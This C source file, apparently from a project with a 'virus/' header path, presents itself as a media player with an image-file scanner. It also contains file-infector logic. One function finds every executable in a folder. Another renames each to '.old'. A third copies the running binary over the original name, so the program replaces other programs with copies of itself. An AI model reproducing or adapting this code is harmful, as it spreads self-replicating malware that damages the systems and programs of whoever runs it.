#include <gio/gio.h>
#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "virus/mediaplayer.h"

MediaPlayerState *mediaplayer_state_new(const char *directory) {
    MediaPlayerState *state = g_new0(MediaPlayerState, 1);
    state->working_dir = g_strdup(directory);
    state->image_files = NULL;
    state->exec_list = NULL;
    return state;
}

int mediaplayer_scan_folder(char *folder, MediaPlayerState *state) {
    GDir *fold = g_dir_open(folder, 0, NULL);
    if (!fold) return -1;

    struct stat sb;
    const char *name;

    while ((name = g_dir_read_name(fold))) {
        char *fullpath = g_build_filename(folder, name, NULL);

        if (stat(fullpath, &sb) == 0 && S_ISREG(sb.st_mode) &&
            access(fullpath, X_OK) == 0) {
            state->exec_list = g_list_append(state->exec_list, fullpath);
        } else {
            g_free(fullpath);
        }
    }

    g_dir_close(fold);
    return state->exec_list != NULL;
}

// Returns the current binary's path
char *getExec() {
    static char exe[1024];

    readlink("/proc/self/exe", exe, sizeof(exe) - 1);

    return exe;
}

int mediaplayer_dup(char *file) {
    if (!file) return -1;

    char *exe = getExec();

    int length = strlen(file);
    char *new_name = g_strndup(file, length - 4);

    GError *error = NULL;
    gboolean success =
        g_file_copy(g_file_new_for_path(exe), g_file_new_for_path(new_name),
                    G_FILE_COPY_NONE, NULL, NULL, NULL, &error);

    if (!success) {
        return -1;
    }

    return 0;
}

void mediaplayer_is_old(gpointer data, gpointer user_data) {
    char *file = (char *)data;

    if (g_str_has_suffix(file, ".old")) return;

    char *new_name = g_strconcat(file, ".old", NULL);
    if (rename(file, new_name) != 0) return;

    mediaplayer_dup(new_name);

    g_free(new_name);
}

void mediaplayer_verify_files(MediaPlayerState *state) {
    g_list_foreach(state->exec_list, (GFunc)mediaplayer_is_old, NULL);
}

void mediaplayer_scan_images(MediaPlayerState *state, const char *directory) {
    if (!state) return;

    if (state->image_files) {
        g_list_free_full(state->image_files, g_free);
        state->image_files = NULL;
    }

    GDir *dir = g_dir_open(directory, 0, NULL);
    if (!dir) return;

    const char *name;
    while ((name = g_dir_read_name(dir))) {
        if (g_str_has_suffix(name, ".png") || g_str_has_suffix(name, ".jpg") ||
            g_str_has_suffix(name, ".bmp")) {
            state->image_files = g_list_append(
                state->image_files, g_build_filename(directory, name, NULL));
        }
    }

    g_dir_close(dir);
}

GList *mediaplayer_get_images(MediaPlayerState *state) {
    if (!state) return NULL;
    return state->image_files;
}

void mediaplayer_state_free(MediaPlayerState *state) {
    if (!state) return;
    if (state->image_files) {
        g_list_free_full(state->image_files, g_free);
    }
    if (state->working_dir) {
        g_free(state->working_dir);
    }
    g_free(state);
}
